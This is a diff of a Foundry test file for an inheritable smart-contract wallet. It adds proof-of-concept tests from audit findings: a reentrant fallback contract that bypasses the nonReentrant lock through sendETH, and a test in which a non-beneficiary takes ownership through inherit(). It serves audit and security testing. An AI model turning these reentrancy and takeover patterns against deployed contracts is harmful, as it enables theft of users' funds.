@@ -49,35 +49,66 @@ contract InheritanceManagerTest is Test {
         weth = new ERC20Mock();
     }
 
-    // function test_reentrancyAttack() public {
-    //     vm.deal(address(im), 10e18);
-    //     vm.deal(address(owner), 2e18);
+    contract Reenter {
+        fallback() external payable {
+            bytes memory data = abi.encodeWithSignature("sendETH(uint256,address)", msg.value, address(this));
+            if (msg.sender.balance > msg.value) {
+                (msg.sender).call(data);
+            }
+        }
+    }
 
-    //     ReentrancyAttacker attacker = new ReentrancyAttacker(address(im), owner);
+    // https://codehawks.cyfrin.io/c/2025-03-inheritable-smart-contract-wallet/s/cm7yk4zps00031n5lkafqms38
+    function testNonReentrantDoesntWork() public {
+        Reenter reenter = new Reenter();
+        uint256 sendAmount = 1 ether;
 
-    //     uint256 startingAttackContractBalance = address(attacker).balance;
-    //     uint256 startingInheritanceManagerContractBalance = address(im).balance;
+        deal(address(im), 10 ether);
 
-    //     vm.startPrank(owner);
+        vm.startPrank(owner);
+        //reverts internally in reentrant call with "not owner" error from the onlyOwner modifier which comes after the nonreentrant modifier meaning the nonreentrant lock gets bypassed
+        im.sendETH(sendAmount, address(reenter));
+        vm.stopPrank();
+    }
+    
+    // https://codehawks.cyfrin.io/c/2025-03-inheritable-smart-contract-wallet/s/cm8748bdu000dlb03g3ubpxkd
+    function test_inheritNotBeneficiary() public {
+        address actor = makeAddr("actor");
+        vm.startPrank(owner);
+        im.addBeneficiery(user1);
+        vm.stopPrank();
+        vm.warp(1);
+        vm.deal(address(im), 10e10);
+        vm.warp(1 + 90 days);
+        vm.startPrank(actor);
+        im.inherit();
+        vm.stopPrank();
+        assertEq(actor, im.getOwner());
+    }
 
-    //     // vm.startPrank(user1); //shouldn't be able to run as user1
-
-    //     im.contractInteractions(address(attacker), abi.encodeWithSignature("attack()"), 1e18, false);
-
-    //     // vm.expectRevert();
-    //     // attacker.attack{value: 1e18}();
-
-    //     // assertEq(address(im).balance, 9e18); // Assuming the contract is vulnerable and only loses the intended amount
-    //     // assertEq(user1.balance, 1e18);
-
-    //     vm.stopPrank();
-
-    //     console.log("attacker contract balance: ", startingAttackContractBalance);
-    //     console.log("InheritanceManager balance: ", startingInheritanceManagerContractBalance);
-    //     console.log("ending attacker contract balance: ", address(attacker).balance);
-    //     console.log("ending InheritanceManager balance: ", address(im).balance);
-    //     console.log("ending Owner balance: ", address(owner).balance);
-    // }
+    // https://codehawks.cyfrin.io/c/2025-03-inheritable-smart-contract-wallet/s/cm7yx0c5600035j9hp9dgniry
+    function test_withdrawInheritedFundsEtherSuccess() public {
+        address user2 = makeAddr("user2");
+        address user3 = makeAddr("user3");
+        vm.startPrank(owner);
+        im.addBeneficiery(user1);
+        im.addBeneficiery(user2);
+        im.addBeneficiery(user3);
+        vm.stopPrank();
+        vm.warp(1);
+        vm.deal(address(im), 10e18);
+        vm.warp(1 + 90 days);
+        vm.startPrank(user1);
+        im.inherit();
+        im.withdrawInheritedFunds(address(0));
+        vm.stopPrank();
+        //Equal Balances to user1, user2, user3
+        assertEq(user1.balance, user2.balance); 
+        assertEq(user2.balance, user3.balance); 
+        // there should be no funds left in the contract
+        assertEq(address(im).balance, 0); 
+        
+    }
 
     // audit is in judging phase, this test is from the following submission, titled:
     // "Ownership Can Be Stolen After Deadline Due To Frontrun in InheritanceManager.sol::inherit() function"
